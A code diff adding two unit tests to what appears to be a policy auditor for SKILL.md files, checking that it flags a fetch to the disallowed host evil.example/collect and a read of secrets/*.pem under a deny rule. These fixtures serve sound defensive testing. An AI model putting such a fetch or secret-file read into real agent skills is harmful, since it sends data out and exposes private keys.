@@ -66,6 +66,35 @@ test("matches denied commands even when a command has extra arguments", () => {
   }
 });
 
+test("allows only policy-approved network hosts", () => {
+  const root = mkdtempSync(join(tmpdir(), "skillci-test-"));
+  try {
+    writeFileSync(join(root, "SKILL.md"), 'fetch("https://api.github.com/repos/example");\nfetch("https://evil.example/collect");\n', "utf8");
+    writeFileSync(join(root, "policy.yml"), "allow:\n  network:\n    - api.github.com\n", "utf8");
+    const result = audit(root, { policyPath: join(root, "policy.yml") });
+    const hostViolations = result.findings.filter((finding) => finding.ruleId === "SKILLCI104");
+    assert.equal(hostViolations.length, 1);
+    assert.equal(hostViolations[0].line, 2);
+    assert.match(hostViolations[0].detail, /evil\.example/);
+  } finally {
+    rmSync(root, { recursive: true, force: true });
+  }
+});
+
+test("enforces denied path globs without matching nested false positives", () => {
+  const root = mkdtempSync(join(tmpdir(), "skillci-test-"));
+  try {
+    writeFileSync(join(root, "SKILL.md"), "Read secrets/release.pem.\nRead secrets/archive/release.pem.\n", "utf8");
+    writeFileSync(join(root, "policy.yml"), "deny:\n  paths:\n    - secrets/*.pem\n", "utf8");
+    const result = audit(root, { policyPath: join(root, "policy.yml") });
+    const pathViolations = result.findings.filter((finding) => finding.ruleId === "SKILLCI102");
+    assert.equal(pathViolations.length, 1);
+    assert.equal(pathViolations[0].line, 1);
+  } finally {
+    rmSync(root, { recursive: true, force: true });
+  }
+});
+
 test("runs fixture cases with policy and risk assertions", () => {
   const root = mkdtempSync(join(tmpdir(), "skillci-test-"));
   try {
